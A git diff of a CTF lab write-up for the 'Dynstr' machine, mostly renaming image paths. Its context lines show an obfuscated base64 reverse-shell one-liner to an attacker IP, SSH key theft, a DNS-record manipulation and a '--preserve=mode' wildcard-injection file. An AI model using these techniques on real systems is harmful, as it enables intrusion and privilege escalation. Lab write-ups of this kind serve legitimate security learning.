@@ -5,7 +5,7 @@ author: jkr
 title: Writeup
 date: 2021-10-17
 publish: True
-
+Dyster
 description: "Dynstr is a medium difficulty Linux machine featuring a blog providing Dynamic DNS services. The application API is vulnerable to command injection using which a foothold can be gained. Enumerating one of the users folders leaks SSH private key. Updating DNS zone records allows SSH access which helps in lateral movement. By exploiting a wildcard injection in a bash script root access can be obtained.
 "
 
@@ -37,16 +37,16 @@ Three ports
 - 53
 - 80
 
-![](/Writeups/Dynster/Pasted image 20211017070917.png)
+![](/Writeups/Dyster/Pasted image 20211017070917.png)
 
 Ubuntu 20
 
 # FootPath
 ### Port 80
 
-![](/Writeups/Dynster/Pasted image 20211017070142.png)
+![](/Writeups/Dyster/Pasted image 20211017070142.png)
 
-![](/Writeups/Dynster/Pasted image 20211017070217.png)
+![](/Writeups/Dyster/Pasted image 20211017070217.png)
 
 Creds
 
@@ -100,7 +100,7 @@ Connection: close
 
 ```
 
-![](/Writeups/Dynster/Pasted image 20211017073334.png)
+![](/Writeups/Dyster/Pasted image 20211017073334.png)
 
 ```bash
 
@@ -114,7 +114,7 @@ echo -ne YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OC85MDAxIDA+JjEK| base64 -d | b
 
 ```
 
-![](/Writeups/Dynster/Pasted image 20211017073652.png)
+![](/Writeups/Dyster/Pasted image 20211017073652.png)
 
 TTY shell
 
@@ -132,7 +132,7 @@ export TERM=xterm
 
 private_key for bindmgr found at `/home/bindmgr/support-case-C62796521`
 
-![](/Writeups/Dynster/Pasted image 20211017074518.png)
+![](/Writeups/Dyster/Pasted image 20211017074518.png)
 
 copy to your machine use vim editor to replace new line
 
@@ -144,7 +144,7 @@ copy to your machine use vim editor to replace new line
 
 sshing using private key is not working.
 
-![](/Writeups/Dynster/Pasted image 20211017075036.png)
+![](/Writeups/Dyster/Pasted image 20211017075036.png)
 
 Entry is only allowed from a patricular domain `.infra.dyna.htb`
 
@@ -190,7 +190,7 @@ www-data@dynstr:/var/www/html/nic$ nsupdate -t 1 -k /etc/bind/infra.key
 > send
 ```
 
-![](/Writeups/Dynster/Pasted image 20211017084635.png)
+![](/Writeups/Dyster/Pasted image 20211017084635.png)
 
 # Root
 
@@ -214,7 +214,7 @@ touch -- '--preserve=mode'
 
 ```
 	
-![](/Writeups/Dynster/Pasted image 20211017085933.png)
+![](/Writeups/Dyster/Pasted image 20211017085933.png)
 
 
 [back](/writeup)
